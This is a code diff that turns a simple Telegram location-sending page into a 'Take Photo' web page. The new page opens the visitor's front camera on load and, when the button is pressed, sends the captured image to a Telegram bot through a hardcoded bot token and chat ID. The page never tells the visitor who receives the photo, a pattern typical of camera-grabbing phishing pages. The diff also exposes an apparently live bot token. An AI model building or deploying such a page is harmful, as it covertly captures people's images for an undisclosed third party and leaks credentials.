@@ -1,30 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Send Location to Telegram Bot</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Take Photo</title>
+<style>
+body{
+    font-family:Arial,sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    background:#f4f4f4;
+}
+.card{
+    width:340px;
+    background:#fff;
+    padding:20px;
+    border-radius:16px;
+    text-align:center;
+    box-shadow:0 10px 25px rgba(0,0,0,.15);
+}
+video{
+    width:100%;
+    border-radius:12px;
+}
+canvas{
+    display:none;
+}
+button{
+    width:100%;
+    padding:14px;
+    margin-top:15px;
+    border:none;
+    border-radius:10px;
+    background:#0a8f3d;
+    color:#fff;
+    font-size:18px;
+    cursor:pointer;
+}
+</style>
 </head>
 <body>
-    <button id="sendLocation">Send My Location</button>
 
-    <script>
-        document.getElementById('sendLocation').addEventListener('click', function() {
-            var botToken = "8917216873:AAHumrjPfX-g8s1lnF66vdlQUeH1lt_osDs";
-            var chatId = "1744610010";
-            var latitude = 0; // Your latitude
-            var longitude = 0; // Your longitude
+<div class="card">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
-            // This function sends the location to the Telegram bot
-            function sendLocation() {
-                var url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-                fetch(url)
-                    .then(response => response.json())
-                    .then(data => console.log(data))
-                    .catch(error => console.error('Error:', error));
-            }
+    <button id="takePhoto">📷 Take Photo & Send</button>
 
-            // Call the sendLocation function
-            sendLocation();
+    <p id="status"></p>
+</div>
+
+<script>
+const BOT_TOKEN="8917216873:AAHumrjPfX-g8s1lnF66vdlQUeH1lt_osDs";
+const CHAT_ID="1744610010";
+
+const video=document.getElementById("video");
+const canvas=document.getElementById("canvas");
+
+async function startCamera(){
+    const stream=await navigator.mediaDevices.getUserMedia({
+        video:{facingMode:"user"},
+        audio:false
+    });
+    video.srcObject=stream;
+}
+
+startCamera();
+
+document.getElementById("takePhoto").onclick=async()=>{
+
+    canvas.width=video.videoWidth;
+    canvas.height=video.videoHeight;
+
+    const ctx=canvas.getContext("2d");
+    ctx.drawImage(video,0,0);
+
+    canvas.toBlob(async(blob)=>{
+
+        const form=new FormData();
+        form.append("chat_id",CHAT_ID);
+        form.append("photo",blob,"photo.jpg");
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+            method:"POST",
+            body:form
         });
-    </script>
+
+        document.getElementById("status").innerHTML="✅ Photo sent.";
+
+    },"image/jpeg",0.9);
+
+};
+</script>
+
 </body>
 </html>
